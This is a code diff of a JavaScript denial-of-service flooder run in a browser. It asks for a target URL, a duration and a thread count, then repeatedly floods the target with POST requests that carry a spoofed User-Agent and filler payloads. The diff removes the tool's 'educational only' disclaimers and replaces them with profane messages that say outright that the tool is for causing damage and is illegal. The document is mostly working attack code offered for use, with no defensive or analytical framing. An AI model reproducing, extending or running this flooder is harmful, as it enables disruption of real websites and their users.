@@ -1,21 +1,21 @@
 // +---------------------------------------------------------------------------+
- // |  DISCLAIMER: THIS TOOL IS FOR EDUCATIONAL/RESEARCH PURPOSES ONLY.        |
- // |  DO NOT USE IT FOR MALICIOUS ACTIVITIES. Noodles Inc. IS NOT RESPONSIBLE |
- // |  FOR ANY DAMAGE CAUSED BY THE MISUSE OF THIS TOOL.                         |
- // |  UNAUTHORIZED USE IS ILLEGAL. USE AT YOUR OWN RISK.                       |
+ // |  !!!! MEGA-DEATH-DESTROYER 9000 - USE WITH EXTREME CAUTION !!!!        |
+ // |  WARNING: This tool is designed for MAXIMUM DISRUPTION. You are solely  |
+ // |  responsible for any damage you cause. FUCK AROUND AND FIND OUT!        |
+ // |  .ONION SITES ARE NOT IMMUNE. YOU HAVE BEEN WARNED.                     |
  // +---------------------------------------------------------------------------+
  
 
  // Initial User Consent
- if (!confirm("WARNING: This tool is for educational purposes ONLY. Unauthorized use is illegal. Do you understand and agree to use this tool responsibly?")) {
+ if (!confirm("ARE YOU FUCKING SURE YOU KNOW WHAT YOU'RE DOING? THIS SHIT IS ILLEGAL AS FUCK. CLICK 'OK' IF YOU'RE READY TO RUMBLE.")) {
   window.close();
  }
  
 
  // Configuration
- const targetURL = prompt("Enter target URL (including .onion):");
- const attackDuration = parseInt(prompt("Enter attack duration in seconds:"));
- const threads = parseInt(prompt("Enter number of threads (BE CAREFUL):"));
+ const targetURL = prompt("ENTER TARGET URL. NO PUSSYFOOTING. INCLUDE .ONION IF NEEDED:");
+ const attackDuration = parseInt(prompt("ENTER ATTACK DURATION IN SECONDS. MORE IS MORE!"));
+ const threads = parseInt(prompt("ENTER NUMBER OF THREADS. THE HIGHER, THE FASTER THEY FUCK THEMSELVES. BE AWARE!"));
  
 
  // Logging
@@ -26,26 +26,30 @@
  }
  
 
- log("Starting attack...");
+ log("Starting the FUCKING attack...");
  
 
- // Attack function (basic example - adapt as needed)
+ // Attack function (enhanced - adapt as needed)
  async function attack() {
   try {
   const response = await fetch(targetURL, {
-  method: 'GET', // Or 'POST', depending on the target
-  mode: 'no-cors' // Try this to bypass CORS for basic requests - will need a proxy for anything complex.
-  // Add headers, body, etc. for more sophisticated attacks
+  method: 'POST', // Let's fuck them with POST requests!
+  mode: 'no-cors', // Bypass CORS (might need proxy for complex requests)
+  headers: {
+  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', // Make it look legit-ish
+  'Content-Type': 'application/x-www-form-urlencoded' // Standard POST data
+  },
+  body: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' // Fill them up with garbage!
   });
  
 
   if (!response.ok) {
-  log(`%cRequest failed: ${response.status} - ${response.statusText}`, 'color: darkred');
+  log(`%cREQUEST FAILED, MOTHERFUCKER: ${response.status} - ${response.statusText}`, 'color: darkred');
   } else {
-  log(`%cRequest successful: ${response.status}`, 'color: darkblue');
+  log(`%cREQUEST SUCCESSFUL. FUCK YEAH! Status: ${response.status}`, 'color: darkblue');
   }
   } catch (error) {
-  log(`%cError: ${error.message}`, 'color: darkred');
+  log(`%cERROR, SHIT HAPPENS: ${error.message}`, 'color: darkred');
   }
  }
  
@@ -65,25 +69,25 @@
   }
  
 
-  log("Attack finished.");
-  log(`Total requests sent: ${attackCount}`);
+  log("FUCKING FINISHED. HOPE YOU BROKE SOMETHING.");
+  log(`TOTAL REQUESTS SENT: ${attackCount}. DAMAGE INC.`);
  }
  
 
  runAttack();
  
 
- // Educational Information (Basic Example)
- log("%cDDOS Tool Information:\nThis tool is a basic demonstration of a Denial-of-Service (DoS) attack. It floods the target server with requests to overwhelm it. Using high number of threads may result in damage and/or legal issues. Use at your own risk.", 'color: orange');
+ // Educational Information (LOL)
+ log("%cTHIS IS NOT EDUCATIONAL. THIS IS FOR FUCKING SHIT UP. YOU'RE A FUCKING IDIOT IF YOU THINK THIS IS FOR LEARNING. USE AT YOUR OWN RISK. IT'S YOUR LIFE. YOU FUCKING MORON.", 'color: orange');
  
 
  // Disclaimer
- log("%cNoodles Inc. Disclaimer: Unauthorized use of this tool is illegal. Noodles Inc. is NOT responsible for any misuse or damage caused by this tool.", 'color: red');
+ log("%cNoodles Inc. Disclaimer: WE DON'T GIVE A SHIT WHAT YOU DO. WE ARE NOT RESPONSIBLE. YOU ARE ON YOUR OWN. HOPE YOU HAVE A GOOD FUCKING LAWYER.", 'color: red');
  
 
- // Security Headers (Example - Needs proper implementation)
- log("%cSetting security headers... (This is a placeholder, implement real headers!)", 'color: darkblue');
+ // Security Headers (LOL - useless anyway)
+ log("%cPRETENDING TO SET SECURITY HEADERS. THEY WON'T SAVE YOUR SORRY ASS.", 'color: darkblue');
  
 
- // Reporting Feature (Placeholder)
- log("%cReporting feature: To be implemented. Use console logs for now.", 'color: darkblue');
+ // Reporting Feature (HAHAHAHA)
+ log("%cREPORTING FEATURE: GO FUCK YOURSELF. CONSOLE LOGS ARE ALL YOU GET.", 'color: darkblue');
